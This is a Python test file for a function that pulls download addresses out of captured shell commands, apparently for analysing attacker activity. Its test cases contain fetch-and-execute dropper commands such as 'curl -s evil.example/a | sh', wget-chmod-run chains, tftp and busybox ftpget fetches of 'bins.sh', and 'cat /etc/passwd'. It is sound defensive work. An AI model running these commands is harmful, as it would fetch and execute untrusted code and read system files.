"""Extraction of attempted-download addresses from command text."""

from __future__ import annotations

import pytest

from surya_kundal.mapping.fetches import MAX_PER_COMMAND, extract


def urls(command: str) -> list[str]:
    return [item.url for item in extract(command)]


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("wget http://1.2.3.4/x.sh", ["http://1.2.3.4/x.sh"]),
        ("cd /tmp && wget http://1.2.3.4/x.sh -O x; chmod +x x; ./x", ["http://1.2.3.4/x.sh"]),
        ("wget -O out.sh http://a.example/z", ["http://a.example/z"]),
        ("sudo wget -q -O- http://a.example/p", ["http://a.example/p"]),
        ("sh -c 'wget http://a.example/p.sh'", ["http://a.example/p.sh"]),
        ("curl -s evil.example/a | sh", ["http://evil.example/a"]),
        ("curl -sL 5.6.7.8:8080/bins.sh | bash", ["http://5.6.7.8:8080/bins.sh"]),
        ("tftp -g -r bins.sh 5.6.7.8", ["tftp://5.6.7.8/bins.sh"]),
        ("tftp 5.6.7.8 -c get bins.sh", ["tftp://5.6.7.8/bins.sh"]),
        ("busybox ftpget 9.9.9.9 local remote", ["ftp://9.9.9.9/remote"]),
        ("busybox ftpget -v -u a -p b 9.9.9.9 local remote", ["ftp://9.9.9.9/remote"]),
        ("git clone https://github.com/a/b.git", ["https://github.com/a/b.git"]),
        ("ls; wget http://a.example/z; wget http://a.example/z", ["http://a.example/z"]),
        (
            "wget http://a.example/1 && curl http://b.example/2",
            ["http://a.example/1", "http://b.example/2"],
        ),
    ],
)
def test_finds_addresses(command: str, expected: list[str]) -> None:
    assert urls(command) == expected


@pytest.mark.parametrize(
    "command",
    [
        "",
        "cat /etc/passwd",
        "echo wget http://x.example/a",
        "wget http://$HOST/x",
        "wget http://`hostname`/x",
        "wget x.sh",
        "git pull http://x.example/a",
        "ls http://x.example/a",
        "x" * 30_000,
    ],
)
def test_ignores_non_fetches(command: str) -> None:
    assert urls(command) == []


def test_tool_is_recorded() -> None:
    assert [i.tool for i in extract("wget http://a.example/1; curl http://b.example/2")] == [
        "wget",
        "curl",
    ]


def test_count_is_bounded() -> None:
    command = "; ".join(f"wget http://h.example/{n}" for n in range(MAX_PER_COMMAND * 3))
    assert len(extract(command)) == MAX_PER_COMMAND


def test_overlong_address_is_dropped() -> None:
    assert urls("wget http://a.example/" + "a" * 3000) == []


def test_trailing_punctuation_is_trimmed() -> None:
    assert urls("wget 'http://a.example/x.sh'.") == ["http://a.example/x.sh"]
